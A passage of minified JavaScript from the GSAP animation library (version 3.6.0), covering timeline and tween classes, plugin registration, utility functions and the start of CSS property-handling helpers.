arguments.length?(this._forcing=1,!this._dp&&this._ts&&(this._start=ye(yt.time-(0<this._ts?t/this._ts:(this.totalDuration()-t)/-this._ts))),e.prototype.totalTime.call(this,t,n),this._forcing=0,this):this._tTime},a.addLabel=function(e,t){return this.labels[e]=We(this,t),this},a.removeLabel=function(e){return delete this.labels[e],this},a.addPause=function(e,t,n){var r=$t.delayedCall(0,t||oe,n);return r.data="isPause",this._hasPause=1,$e(this,r,We(this,e))},a.removePause=function(e){var t=this._first;for(e=We(this,e);t;)t._start===e&&"isPause"===t.data&&Fe(t),t=t._next},a.killTweensOf=function(e,t,n){for(var r=this.getTweensOf(e,n),i=r.length;i--;)Lt!==r[i]&&r[i].kill(e,t);return this},a.getTweensOf=function(e,t){for(var n,r=[],i=Ze(e),a=this._first,o=U(t);a;)a instanceof $t?be(a._targets,i)&&(o?(!Lt||a._initted&&a._ts)&&a.globalTime(0)<=t&&a.globalTime(a.totalDuration())>t:!t||a.isActive())&&r.push(a):(n=a.getTweensOf(i,t)).length&&r.push.apply(r,n),a=a._next;return r},a.tweenTo=function(e,t){t=t||{};var n=this,r=We(n,e),i=t,a=i.startAt,o=i.onStart,s=i.onStartParams,l=i.immediateRender,c=$t.to(n,ke({ease:"none",lazy:!1,immediateRender:!1,time:r,overwrite:"auto",duration:t.duration||Math.abs((r-(a&&"time"in a?a.time:n._time))/n.timeScale())||P,onStart:function(){n.pause();var e=t.duration||Math.abs((r-n._time)/n.timeScale());c._dur!==e&&Ve(c,e,0,1).render(c._time,!0,!0),o&&o.apply(c,s||[])}},t));return l?c.render(0):c},a.tweenFromTo=function(e,t,n){return this.tweenTo(t,ke({startAt:{time:We(this,e)}},n))},a.recent=function(){return this._recent},a.nextLabel=function(e){return void 0===e&&(e=this._time),lt(this,We(this,e))},a.previousLabel=function(e){return void 0===e&&(e=this._time),lt(this,We(this,e),1)},a.currentLabel=function(e){return arguments.length?this.seek(e,!0):this.previousLabel(this._time+P)},a.shiftChildren=function(e,t,n){void 0===n&&(n=0);for(var r,i=this._first,a=this.labels;i;)i._start>=n&&(i._start+=e,i._end+=e),i=i._next;if(t)for(r in a)a[r]>=n&&(a[r]+=e);return Le(this)},a.invalidate=function(){var t=this._first;for(this._lock=0;t;)t.invalidate(),t=t._next;return e.prototype.invalidate.call(this)},a.clear=function(e){void 0===e&&(e=!0);for(var t,n=this._first;n;)t=n._next,this.remove(n),n=t;return this._dp&&(this._time=this._tTime=this._pTime=0),e&&(this.labels={}),Le(this)},a.totalDuration=function(e){var t,n,r,a=0,o=this,s=o._last,l=1e8;if(arguments.length)return o.timeScale((o._repeat<0?o.duration():o.totalDuration())/(o.reversed()?-e:e));if(o._dirty){for(r=o.parent;s;)t=s._prev,s._dirty&&s.totalDuration(),l<(n=s._start)&&o._sort&&s._ts&&!o._lock?(o._lock=1,$e(o,s,n-s._delay,1)._lock=0):l=n,n<0&&s._ts&&(a-=n,(!r&&!o._dp||r&&r.smoothChildTiming)&&(o._start+=n/o._ts,o._time-=n,o._tTime-=n),o.shiftChildren(-n,!1,-1/0),l=0),s._end>a&&s._ts&&(a=s._end),s=t;Ve(o,o===i&&o._time>a?o._time:a,1,1),o._dirty=0}return o._tDur},r.updateRoot=function(e){if(i._ts&&(Ce(i,De(e,i)),c=yt.frame),yt.frame>=pe){pe+=E.autoSleep||120;var t=i._first;if((!t||!t._ts)&&E.autoSleep&&yt._listeners.length<2){for(;t&&!t._ts;)t=t._next;t||yt.sleep()}}},r}(It);ke(Ft.prototype,{_lock:0,_hasPause:0,_forcing:0});var Lt,Ot=function(e,t,n,r,i,a,o,s,l){j(r)&&(r=r(i||0,e,a));var c,u=e[t],d="get"!==n?n:j(u)?l?e[t.indexOf("set")||!j(e["get"+t.substr(3)])?t:"get"+t.substr(3)](l):e[t]():u,p=j(u)?l?Vt:Ht:zt;if(R(r)&&(~r.indexOf("random(")&&(r=ot(r)),"="===r.charAt(1)&&(r=parseFloat(d)+parseFloat(r.substr(2))*("-"===r.charAt(0)?-1:1)+(Xe(d)||0))),d!==r)return isNaN(d*r)?function(e,t,n,r,i,a,o){var s,l,c,u,d,p,h,f,A=new tn(this._pt,e,t,0,1,qt,null,i),m=0,v=0;for(A.b=n,A.e=r,n+="",(h=~(r+="").indexOf("random("))&&(r=ot(r)),a&&(a(f=[n,r],e,t),n=f[0],r=f[1]),l=n.match(Y)||[];s=Y.exec(r);)u=s[0],d=r.substring(m,s.index),c?c=(c+1)%5:"rgba("===d.substr(-5)&&(c=1),u!==l[v++]&&(p=parseFloat(l[v-1])||0,A._pt={_next:A._pt,p:d||1===v?d:",",s:p,c:"="===u.charAt(1)?parseFloat(u.substr(2))*("-"===u.charAt(0)?-1:1):parseFloat(u)-p,m:c&&c<4?Math.round:0},m=Y.lastIndex);return A.c=m<r.length?r.substring(m,r.length):"",A.fp=o,(J.test(r)||h)&&(A.e=0),this._pt=A}.call(this,e,t,d,r,p,s||E.stringFilter,l):(c=new tn(this._pt,e,t,+d||0,r-(d||0),"boolean"==typeof u?Kt:Wt,0,p),l&&(c.fp=l),o&&c.modifier(o,this,e),this._pt=c)},Nt=function(e,t,n,r,i,a){var o,s,l,c;if(ue[e]&&!1!==(o=new ue[e]).init(i,o.rawVars?t[e]:function(e,t,n,r,i){if(j(e)&&(e=Rt(e,i,t,n,r)),!z(e)||e.style&&e.nodeType||W(e)||G(e))return R(e)?Rt(e,i,t,n,r):e;var a,o={};for(a in e)o[a]=Rt(e[a],i,t,n,r);return o}(t[e],r,i,a,n),n,r,a)&&(n._pt=s=new tn(n._pt,i,e,0,1,o.render,o,0,o.priority),n!==u))for(l=n._ptLookup[n._targets.indexOf(i)],c=o._props.length;c--;)l[o._props[c]]=s;return o},Dt=function e(t,n){var a,o,s,l,c,u,d,p,h,f,A,m,v,g=t.vars,y=g.ease,b=g.startAt,_=g.immediateRender,w=g.lazy,C=g.onUpdate,x=g.onUpdateParams,S=g.callbackScope,k=g.runBackwards,M=g.yoyoEase,B=g.keyframes,E=g.autoRevert,I=t._dur,F=t._startAt,L=t._targets,O=t.parent,N=O&&"nested"===O.data?O.parent._targets:L,D="auto"===t._overwrite&&!r,R=t.timeline;if(R&&(!B||!y)&&(y="none"),t._ease=kt(y,T.ease),t._yEase=M?xt(kt(!0===M?y:M,T.ease)):0,M&&t._yoyo&&!t._repeat&&(M=t._yEase,t._yEase=t._ease,t._ease=M),!R){if(m=(p=L[0]?me(L[0]).harness:0)&&g[p.prop],a=Te(g,se),F&&F.render(-1,!0).kill(),b){if(Fe(t._startAt=$t.set(L,ke({data:"isStart",overwrite:!1,parent:O,immediateRender:!0,lazy:H(w),startAt:null,delay:0,onUpdate:C,onUpdateParams:x,callbackScope:S,stagger:0},b))),_)if(0<n)E||(t._startAt=0);else if(I&&!(n<0&&F))return void(n&&(t._zTime=n))}else if(k&&I)if(F)!E&&(t._startAt=0);else if(n&&(_=!1),s=ke({overwrite:!1,data:"isFromStart",lazy:_&&H(w),immediateRender:_,stagger:0,parent:O},a),m&&(s[p.prop]=m),Fe(t._startAt=$t.set(L,s)),_){if(!n)return}else e(t._startAt,P);for(t._pt=0,w=I&&H(w)||w&&!I,o=0;o<L.length;o++){if(d=(c=L[o])._gsap||Ae(L)[o]._gsap,t._ptLookup[o]=f={},ce[d.id]&&le.length&&we(),A=N===L?o:N.indexOf(c),p&&!1!==(h=new p).init(c,m||a,t,A,N)&&(t._pt=l=new tn(t._pt,c,h.name,0,1,h.render,h,0,h.priority),h._props.forEach((function(e){f[e]=l})),h.priority&&(u=1)),!p||m)for(s in a)ue[s]&&(h=Nt(s,a,t,A,c,N))?h.priority&&(u=1):f[s]=l=Ot.call(t,c,s,"get",a[s],A,N,0,g.stringFilter);t._op&&t._op[o]&&t.kill(c,t._op[o]),D&&t._pt&&(Lt=t,i.killTweensOf(c,f,t.globalTime(0)),v=!t.parent,Lt=0),t._pt&&w&&(ce[d.id]=1)}u&&en(t),t._onInit&&t._onInit(t)}t._from=!R&&!!g.runBackwards,t._onUpdate=C,t._initted=(!t._op||t._pt)&&!v},Rt=function(e,t,n,r,i){return j(e)?e.call(t,n,r,i):R(e)&&~e.indexOf("random(")?ot(e):e},jt=fe+"repeat,repeatDelay,yoyo,repeatRefresh,yoyoEase",Ut=(jt+",id,stagger,delay,duration,paused,scrollTrigger").split(","),$t=function(e){function a(t,a,o,s){var l;"number"==typeof a&&(o.duration=a,a=o,o=null);var c,u,d,p,h,f,A,m,v=(l=e.call(this,s?a:Pe(a),o)||this).vars,g=v.duration,y=v.delay,b=v.immediateRender,_=v.stagger,w=v.overwrite,C=v.keyframes,x=v.defaults,S=v.scrollTrigger,k=v.yoyoEase,M=l.parent,B=(W(t)||G(t)?U(t[0]):"length"in a)?[t]:Ze(t);if(l._targets=B.length?Ae(B):ie(0,!E.nullTargetWarn)||[],l._ptLookup=[],l._overwrite=w,C||_||Q(g)||Q(y)){if(a=l.vars,(c=l.timeline=new Ft({data:"nested",defaults:x||{}})).kill(),c.parent=c._dp=n(l),c._start=0,C)ke(c.vars.defaults,{ease:"none"}),C.forEach((function(e){return c.to(B,e,">")}));else{if(p=B.length,A=_?tt(_):oe,z(_))for(h in _)~jt.indexOf(h)&&(m||(m={}),m[h]=_[h]);for(u=0;u<p;u++){for(h in d={},a)Ut.indexOf(h)<0&&(d[h]=a[h]);d.stagger=0,k&&(d.yoyoEase=k),m&&Be(d,m),f=B[u],d.duration=+Rt(g,n(l),u,f,B),d.delay=(+Rt(y,n(l),u,f,B)||0)-l._delay,!_&&1===p&&d.delay&&(l._delay=y=d.delay,l._start+=y,d.delay=0),c.to(f,d,A(u,f,B))}c.duration()?g=y=0:l.timeline=0}g||l.duration(g=c.duration())}else l.timeline=0;return!0!==w||r||(Lt=n(l),i.killTweensOf(B),Lt=0),M&&Ue(M,n(l)),(b||!g&&!C&&l._start===ye(M._time)&&H(b)&&function e(t){return!t||t._ts&&e(t.parent)}(n(l))&&"nested"!==M.data)&&(l._tTime=-P,l.render(Math.max(0,-y))),S&&ze(n(l),S),l}t(a,e);var o=a.prototype;return o.render=function(e,t,n){var r,i,a,o,s,l,c,u,d,p=this._time,h=this._tDur,f=this._dur,A=h-P<e&&0<=e?h:e<P?0:e;if(f){if(A!==this._tTime||!e||n||!this._initted&&this._tTime||this._startAt&&this._zTime<0!=e<0){if(r=A,u=this.timeline,this._repeat){if(o=f+this._rDelay,this._repeat<-1&&e<0)return this.totalTime(100*o+e,t,n);if(r=ye(A%o),A===h?(a=this._repeat,r=f):((a=~~(A/o))&&a===A/o&&(r=f,a--),f<r&&(r=f)),(l=this._yoyo&&1&a)&&(d=this._yEase,r=f-r),s=Ne(this._tTime,o),r===p&&!n&&this._initted)return this;a!==s&&(u&&this._yEase&&St(u,l),!this.vars.repeatRefresh||l||this._lock||(this._lock=n=1,this.render(ye(o*a),!0).invalidate()._lock=0))}if(!this._initted){if(He(this,e<0?e:r,n,t))return this._tTime=0,this;if(f!==this._dur)return this.render(e,t,n)}for(this._tTime=A,this._time=r,!this._act&&this._ts&&(this._act=1,this._lazy=0),this.ratio=c=(d||this._ease)(r/f),this._from&&(this.ratio=c=1-c),r&&!p&&!t&&ct(this,"onStart"),i=this._pt;i;)i.r(c,i.d),i=i._next;u&&u.render(e<0?e:!r&&l?-P:u._dur*c,t,n)||this._startAt&&(this._zTime=e),this._onUpdate&&!t&&(e<0&&this._startAt&&this._startAt.render(e,!0,n),ct(this,"onUpdate")),this._repeat&&a!==s&&this.vars.onRepeat&&!t&&this.parent&&ct(this,"onRepeat"),A!==this._tDur&&A||this._tTime!==A||(e<0&&this._startAt&&!this._onUpdate&&this._startAt.render(e,!0,!0),(e||!f)&&(A===this._tDur&&0<this._ts||!A&&this._ts<0)&&Fe(this,1),t||e<0&&!p||!A&&!p||(ct(this,A===h?"onComplete":"onReverseComplete",!0),this._prom&&!(A<h&&0<this.timeScale())&&this._prom()))}}else!function(e,t,n,r){var i,a,o,s=e.ratio,l=t<0||!t&&(!e._start&&function e(t){var n=t.parent;return n&&n._ts&&n._initted&&!n._lock&&(n.rawTime()<0||e(n))}(e)||(e._ts<0||e._dp._ts<0)&&"isFromStart"!==e.data&&"isStart"!==e.data)?0:1,c=e._rDelay,u=0;if(c&&e._repeat&&(u=qe(0,e._tDur,t),a=Ne(u,c),o=Ne(e._tTime,c),e._yoyo&&1&a&&(l=1-l),a!==o&&(s=1-l,e.vars.repeatRefresh&&e._initted&&e.invalidate())),l!==s||r||e._zTime===P||!t&&e._zTime){if(!e._initted&&He(e,t,r,n))return;for(o=e._zTime,e._zTime=t||(n?P:0),n||(n=t&&!o),e.ratio=l,e._from&&(l=1-l),e._time=0,e._tTime=u,n||ct(e,"onStart"),i=e._pt;i;)i.r(l,i.d),i=i._next;e._startAt&&t<0&&e._startAt.render(t,!0,!0),e._onUpdate&&!n&&ct(e,"onUpdate"),u&&e._repeat&&!n&&e.parent&&ct(e,"onRepeat"),(t>=e._tDur||t<0)&&e.ratio===l&&(l&&Fe(e,1),n||(ct(e,l?"onComplete":"onReverseComplete",!0),e._prom&&e._prom()))}else e._zTime||(e._zTime=t)}(this,e,t,n);return this},o.targets=function(){return this._targets},o.invalidate=function(){return this._pt=this._op=this._startAt=this._onUpdate=this._lazy=this.ratio=0,this._ptLookup=[],this.timeline&&this.timeline.invalidate(),e.prototype.invalidate.call(this)},o.kill=function(e,t){if(void 0===t&&(t="all"),!(e||t&&"all"!==t))return this._lazy=this._pt=0,this.parent?ut(this):this;if(this.timeline){var n=this.timeline.totalDuration();return this.timeline.killTweensOf(e,t,Lt&&!0!==Lt.vars.overwrite)._first||ut(this),this.parent&&n!==this.timeline.totalDuration()&&Ve(this,this._dur*this.timeline._tDur/n,0,1),this}var r,i,a,o,s,l,c,u=this._targets,d=e?Ze(e):u,p=this._ptLookup,h=this._pt;if((!t||"all"===t)&&function(e,t){for(var n=e.length,r=n===t.length;r&&n--&&e[n]===t[n];);return n<0}(u,d))return"all"===t&&(this._pt=0),ut(this);for(r=this._op=this._op||[],"all"!==t&&(R(t)&&(s={},ge(t,(function(e){return s[e]=1})),t=s),t=function(e,t){var n,r,i,a,o=e[0]?me(e[0]).harness:0,s=o&&o.aliases;if(!s)return t;for(r in n=Be({},t),s)if(r in n)for(i=(a=s[r].split(",")).length;i--;)n[a[i]]=n[r];return n}(u,t)),c=u.length;c--;)if(~d.indexOf(u[c]))for(s in i=p[c],"all"===t?(r[c]=t,o=i,a={}):(a=r[c]=r[c]||{},o=t),o)(l=i&&i[s])&&("kill"in l.d&&!0!==l.d.kill(s)||Ie(this,l,"_pt"),delete i[s]),"all"!==a&&(a[s]=1);return this._initted&&!this._pt&&h&&ut(this),this},a.to=function(e,t){return new a(e,t,arguments[2])},a.from=function(e,t){return new a(e,_e(arguments,1))},a.delayedCall=function(e,t,n,r){return new a(t,0,{immediateRender:!1,lazy:!1,overwrite:!1,delay:e,onComplete:t,onReverseComplete:t,onCompleteParams:n,onReverseCompleteParams:n,callbackScope:r})},a.fromTo=function(e,t,n){return new a(e,_e(arguments,2))},a.set=function(e,t){return t.duration=0,t.repeatDelay||(t.repeat=0),new a(e,t)},a.killTweensOf=function(e,t,n){return i.killTweensOf(e,t,n)},a}(It);ke($t.prototype,{_targets:[],_lazy:0,_startAt:0,_op:0,_onInit:0}),ge("staggerTo,staggerFrom,staggerFromTo",(function(e){$t[e]=function(){var t=new Ft,n=Ye.call(arguments,0);return n.splice("staggerFromTo"===e?5:4,0,0),t[e].apply(t,n)}}));var zt=function(e,t,n){return e[t]=n},Ht=function(e,t,n){return e[t](n)},Vt=function(e,t,n,r){return e[t](r.fp,n)},Qt=function(e,t,n){return e.setAttribute(t,n)},Gt=function(e,t){return j(e[t])?Ht:$(e[t])&&e.setAttribute?Qt:zt},Wt=function(e,t){return t.set(t.t,t.p,Math.round(1e4*(t.s+t.c*e))/1e4,t)},Kt=function(e,t){return t.set(t.t,t.p,!!(t.s+t.c*e),t)},qt=function(e,t){var n=t._pt,r="";if(!e&&t.b)r=t.b;else if(1===e&&t.e)r=t.e;else{for(;n;)r=n.p+(n.m?n.m(n.s+n.c*e):Math.round(1e4*(n.s+n.c*e))/1e4)+r,n=n._next;r+=t.c}t.set(t.t,t.p,r,t)},Xt=function(e,t){for(var n=t._pt;n;)n.r(e,n.d),n=n._next},Yt=function(e,t,n,r){for(var i,a=this._pt;a;)i=a._next,a.p===r&&a.modifier(e,t,n),a=i},Jt=function(e){for(var t,n,r=this._pt;r;)n=r._next,r.p===e&&!r.op||r.op===e?Ie(this,r,"_pt"):r.dep||(t=1),r=n;return!t},Zt=function(e,t,n,r){r.mSet(e,t,r.m.call(r.tween,n,r.mt),r)},en=function(e){for(var t,n,r,i,a=e._pt;a;){for(t=a._next,n=r;n&&n.pr>a.pr;)n=n._next;(a._prev=n?n._prev:i)?a._prev._next=a:r=a,(a._next=n)?n._prev=a:i=a,a=t}e._pt=r},tn=function(){function e(e,t,n,r,i,a,o,s,l){this.t=t,this.s=r,this.c=i,this.p=n,this.r=a||Wt,this.d=o||this,this.set=s||zt,this.pr=l||0,(this._next=e)&&(e._prev=this)}return e.prototype.modifier=function(e,t,n){this.mSet=this.mSet||this.set,this.set=Zt,this.m=e,this.mt=n,this.tween=t},e}();ge(fe+"parent,duration,ease,delay,overwrite,runBackwards,startAt,yoyo,immediateRender,repeat,repeatDelay,data,paused,reversed,lazy,callbackScope,stringFilter,id,yoyoEase,stagger,inherit,repeatRefresh,keyframes,autoRevert,scrollTrigger",(function(e){return se[e]=1})),te.TweenMax=te.TweenLite=$t,te.TimelineLite=te.TimelineMax=Ft,i=new Ft({sortChildren:!1,defaults:T,autoRemoveChildren:!0,id:"root",smoothChildTiming:!0}),E.stringFilter=gt;var nn={registerPlugin:function(){for(var e=arguments.length,t=new Array(e),n=0;n<e;n++)t[n]=arguments[n];t.forEach((function(e){return function(e){var t=(e=!e.name&&e.default||e).name,n=j(e),r=t&&!n&&e.init?function(){this._props=[]}:e,i={init:oe,render:Xt,add:Ot,kill:Jt,modifier:Yt,rawVars:0},a={targetTest:0,get:0,getSetter:Gt,aliases:{},register:0};if(bt(),e!==r){if(ue[t])return;ke(r,ke(Te(e,i),a)),Be(r.prototype,Be(i,Te(e,a))),ue[r.prop=t]=r,e.targetTest&&(he.push(r),se[t]=1),t=("css"===t?"CSS":t.charAt(0).toUpperCase()+t.substr(1))+"Plugin"}ae(t,r),e.register&&e.register(on,r,tn)}(e)}))},timeline:function(e){return new Ft(e)},getTweensOf:function(e,t){return i.getTweensOf(e,t)},getProperty:function(e,t,n,r){R(e)&&(e=Ze(e)[0]);var i=me(e||{}).get,a=n?Se:xe;return"native"===n&&(n=""),e?t?a((ue[t]&&ue[t].get||i)(e,t,n,r)):function(t,n,r){return a((ue[t]&&ue[t].get||i)(e,t,n,r))}:e},quickSetter:function(e,t,n){if(1<(e=Ze(e)).length){var r=e.map((function(e){return on.quickSetter(e,t,n)})),i=r.length;return function(e){for(var t=i;t--;)r[t](e)}}e=e[0]||{};var a=ue[t],o=me(e),s=o.harness&&(o.harness.aliases||{})[t]||t,l=a?function(t){var r=new a;u._pt=0,r.init(e,n?t+n:t,u,0,[e]),r.render(1,r),u._pt&&Xt(1,u)}:o.set(e,s);return a?l:function(t){return l(e,s,n?t+n:t,o,1)}},isTweening:function(e){return 0<i.getTweensOf(e,!0).length},defaults:function(e){return e&&e.ease&&(e.ease=kt(e.ease,T.ease)),Ee(T,e||{})},config:function(e){return Ee(E,e||{})},registerEffect:function(e){var t=e.name,n=e.effect,r=e.plugins,i=e.defaults,a=e.extendTimeline;(r||"").split(",").forEach((function(e){return e&&!ue[e]&&!te[e]&&ie()})),de[t]=function(e,t,r){return n(Ze(e),ke(t||{},i),r)},a&&(Ft.prototype[t]=function(e,n,r){return this.add(de[t](e,z(n)?n:(r=n)&&{},this),r)})},registerEase:function(e,t){_t[e]=kt(t)},parseEase:function(e,t){return arguments.length?kt(e,t):_t},getById:function(e){return i.getById(e)},exportRoot:function(e,t){void 0===e&&(e={});var n,r,a=new Ft(e);for(a.smoothChildTiming=H(e.smoothChildTiming),i.remove(a),a._dp=0,a._time=a._tTime=i._time,n=i._first;n;)r=n._next,!t&&!n._dur&&n instanceof $t&&n.vars.onComplete===n._targets[0]||$e(a,n,n._start-n._delay),n=r;return $e(i,a,0),a},utils:{wrap:function e(t,n,r){var i=n-t;return W(t)?at(t,e(0,t.length),n):Ke(r,(function(e){return(i+(e-t)%i)%i+t}))},wrapYoyo:function e(t,n,r){var i=n-t,a=2*i;return W(t)?at(t,e(0,t.length-1),n):Ke(r,(function(e){return t+(i<(e=(a+(e-t)%a)%a||0)?a-e:e)}))},distribute:tt,random:it,snap:rt,normalize:function(e,t,n){return st(e,t,0,1,n)},getUnit:Xe,clamp:function(e,t,n){return Ke(n,(function(n){return qe(e,t,n)}))},splitColor:ht,toArray:Ze,mapRange:st,pipe:function(){for(var e=arguments.length,t=new Array(e),n=0;n<e;n++)t[n]=arguments[n];return function(e){return t.reduce((function(e,t){return t(e)}),e)}},unitize:function(e,t){return function(n){return e(parseFloat(n))+(t||Xe(n))}},interpolate:function e(t,n,r,i){var a=isNaN(t+n)?0:function(e){return(1-e)*t+e*n};if(!a){var o,s,l,c,u,d=R(t),p={};if(!0===r&&(i=1)&&(r=null),d)t={p:t},n={p:n};else if(W(t)&&!W(n)){for(l=[],c=t.length,u=c-2,s=1;s<c;s++)l.push(e(t[s-1],t[s]));c--,a=function(e){e*=c;var t=Math.min(u,~~e);return l[t](e-t)},r=n}else i||(t=Be(W(t)?[]:{},t));if(!l){for(o in n)Ot.call(p,t,o,"get",n[o]);a=function(e){return Xt(e,p)||(d?t.p:t)}}}return Ke(r,a)},shuffle:et},install:re,effects:de,ticker:yt,updateRoot:Ft.updateRoot,plugins:ue,globalTimeline:i,core:{PropTween:tn,globals:ae,Tween:$t,Timeline:Ft,Animation:It,getCache:me,_removeLinkedListItem:Ie,suppressOverwrites:function(e){return r=e}}};ge("to,from,fromTo,delayedCall,set,killTweensOf",(function(e){return nn[e]=$t[e]})),yt.add(Ft.updateRoot),u=nn.to({},{duration:0});var rn=function(e,t){for(var n=e._pt;n&&n.p!==t&&n.op!==t&&n.fp!==t;)n=n._next;return n},an=function(e,t){return{name:e,rawVars:1,init:function(e,n,r){r._onInit=function(e){var r,i;if(R(n)&&(r={},ge(n,(function(e){return r[e]=1})),n=r),t){for(i in r={},n)r[i]=t(n[i]);n=r}!function(e,t){var n,r,i,a=e._targets;for(n in t)for(r=a.length;r--;)(i=e._ptLookup[r][n])&&(i=i.d)&&(i._pt&&(i=rn(i,n)),i&&i.modifier&&i.modifier(t[n],e,a[r],n))}(e,n)}}}},on=nn.registerPlugin({name:"attr",init:function(e,t,n,r,i){var a,o;for(a in t)(o=this.add(e,"setAttribute",(e.getAttribute(a)||0)+"",t[a],r,i,0,0,a))&&(o.op=a),this._props.push(a)}},{name:"endArray",init:function(e,t){for(var n=t.length;n--;)this.add(e,n,e[n]||0,t[n])}},an("roundProps",nt),an("modifiers"),an("snap",rt))||nn;$t.version=Ft.version=on.version="3.6.0",l=1,V()&&bt();var sn,ln,cn,un,dn,pn,hn,fn,An=_t.Power0,mn=_t.Power1,vn=_t.Power2,gn=_t.Power3,yn=_t.Power4,bn=_t.Linear,_n=_t.Quad,wn=_t.Cubic,Cn=_t.Quart,xn=_t.Quint,Sn=_t.Strong,kn=_t.Elastic,Mn=_t.Back,Bn=_t.SteppedEase,En=_t.Bounce,Tn=_t.Sine,Pn=_t.Expo,In=_t.Circ,Fn={},Ln=180/Math.PI,On=Math.PI/180,Nn=Math.atan2,Dn=/([A-Z])/g,Rn=/(?:left|right|width|margin|padding|x)/i,jn=/[\s,\(]\S/,Un={autoAlpha:"opacity,visibility",scale:"scaleX,scaleY",alpha:"opacity"},$n=function(e,t){return t.set(t.t,t.p,Math.round(1e4*(t.s+t.c*e))/1e4+t.u,t)},zn=function(e,t){return t.set(t.t,t.p,1===e?t.e:Math.round(1e4*(t.s+t.c*e))/1e4+t.u,t)},Hn=function(e,t){return t.set(t.t,t.p,e?Math.round(1e4*(t.s+t.c*e))/1e4+t.u:t.b,t)},Vn=function(e,t){var n=t.s+t.c*e;t.set(t.t,t.p,~~(n+(n<0?-.5:.5))+t.u,t)},Qn=function(e,t){return t.set(t.t,t.p,e?t.e:t.b,t)},Gn=function(e,t){return t.set(t.t,t.p,1!==e?t.b:t.e,t)},Wn=function(e,t,n){return e.style[t]=n},Kn=function(e,t,n){return e.style.setProperty(t,n)},qn=function(e,t,n){return e._gsap[t]=n},Xn=function(e,t,n){return e._gsap.scaleX=e._gsap.scaleY=n},Yn=function(e,t,n,r,i){var a=e._gsap;a.scaleX=a.scaleY=n,a.renderTransform(i,a)},Jn=function(e,t,n,r,i){var a=e._gsap;a[t]=n,a.renderTransform(i,a)},Zn="transform",er=Zn+"Origin",tr=function(e,t){var n=ln.createElementNS?ln.createElementNS((t||"http://www.w3.org/1999/xhtml").replace(/^https/,"http"),e):ln.createElement(e);return n.style?n:ln.createElement(e)},nr=function e(t,n,r){var i=getComputedStyle(t);return i[n]||i.getPropertyValue(n.replace(Dn,"-$1").toLowerCase())||i.getPropertyValue(n)||!r&&e(t,ir(n)||n,1)||""},rr="O,Moz,ms,Ms,Webkit".split(","),ir=function(e,t,n){var r=(t||dn).style,i=5;if(e in r&&!n)return e;for(e=e.charAt(0).toUpperCase()+e.substr(1);i--&&!(rr[i]+e in r););return i<0?null:(3===i?"ms":0<=i?rr[i]:"")+e},ar=function(){"undefined"!=typeof window&&window.document&&(sn=window,ln=sn.document,cn=ln.documentElement,dn=tr("div")||{style:{}},pn=tr("div"),Zn=ir(Zn),er=Zn+"Origin",dn.style.cssText="border-width:0;line-height:0;position:absolute;padding:0",fn=!!ir("perspective"),un=1)},or=function e(t){var n,r=tr("svg",this.ownerSVGElement&&this.ownerSVGElement.getAttribute("xmlns")||"http://www.w3.org/2000/svg"),i=this.parentNode,a=this.nextSibling,o=this.style.cssText;if(cn.appendChild(r),r.appendChild(this),this.style.display="block",t)try{n=this.getBBox(),this._gsapBBox=this.getBBox,this.getBBox=e}catch(e){}else this._gsapBBox&&(n=this._gsapBBox());return i&&(a?i.insertBefore(this,a):i.appendChild(this)),cn.removeChild(r),this.style.cssText=o,n},sr=function(e,t){for(var n=t.length;n--;)if(e.hasAttribute(t[n]))return e.getAttribute(t[n])},lr=function(e){var t;try{t=e.getBBox()}catch(n){t=or.call(e,!0)}return t&&(t.width||t.height)||e.getBBox===or||(t=or.call(e,!0)),!t||t.width||t.x||t.y?t:{x:+sr(e,["x","cx","x1"])||0,y:+sr(e,["y","cy","y1"])||0,width:0,height:0}},cr=function(e){return!(!e.getCTM||e.parentNode&&!e.ownerSVGElement||!lr(e))},ur=function(e,t){if(t){var n=e.style;t in Fn&&t!==er&&(t=Zn),n.removeProperty?("ms"!==t.substr(0,2)&&"webkit"!==t.substr(0,6)||(t="-"+t),n.removeProperty(t.replace(Dn,"-$1").toLowerCase())):n.removeAttribute(t)}},dr=function(e,t,n,r,i,a){var o=new tn(e._pt,t,n,0,1,a?Gn:Qn);return(e._pt=o).b=r,o.e=i,e._props.push(n),o},pr={deg:1,rad:1,turn:1},hr=function e(t,n,r,i){var a,o,s,l,c=parseFloat(r)||0,u=(r+"").trim().substr((c+"").length)||"px",d=dn.style,p=Rn.test(n),h="svg"===t.tagName.toLowerCase(),f=(h?"client":"offset")+(p?"Width":"Height"),A="px"===i,m="%"===i;return i===u||!c||pr[i]||pr[u]?c:("px"!==u&&!A&&(c=e(t,n,r,"px")),l=t.getCTM&&cr(t),!m&&"%"!==u||!Fn[n]&&!~n.indexOf("adius")?(d[p?"width":"height"]=100+(A?u:i),o=~n.indexOf("adius")||"em"===i&&t.appendChild&&!h?t:t.parentNode,l&&(o=(t.ownerSVGElement||{}).parentNode),o&&o!==ln&&o.appendChild||(o=ln.body),(s=o._gsap)&&m&&s.width&&p&&s.time===yt.time?ye(c/s.width*100):((m||"%"===u)&&(d.position=nr(t,"position")),o===t&&(d.position="static"),o.appendChild(dn),a=dn[f],o.removeChild(dn),d.position="absolute",p&&m&&((s=me(o)).time=yt.time,s.width=o[f]),ye(A?a*c/100:a&&c?100/a*c:0))):(a=l?t.getBBox()[p?"width":"height"]:t[f],ye(m?c/a*100:c/100*a)))},fr=function(e,t,n,r){var i;return un||ar(),t in Un&&"transform"!==t&&~(t=Un[t]).indexOf(",")&&(t=t.split(",")[0]),Fn[t]&&"transform"!==t?(i=Sr(e,r),i="transformOrigin"!==t?i[t]:kr(nr(e,er))+" "+i.zOrigin+"px"):(!(i=e.style[t])||"auto"===i||r||~(i+"").indexOf("calc("))&&(i=gr[t]&&gr[t](e,t,n)||nr(e,t)||ve(e,t)||("opacity"===t?1:0)),n&&!~(i+"").trim().indexOf(" ")?hr(e,t,i,n)+n:i},Ar=function(e,t,n,r){if(!n||"none"===n){var i=ir(t,e,1),a=i&&nr(e,i,1);a&&a!==n?(t=i,n=a):"borderColor"===t&&(n=nr(e,"borderTopColor"))}var o,s,l,c,u,d,p,h,f,A,m,v,g=new 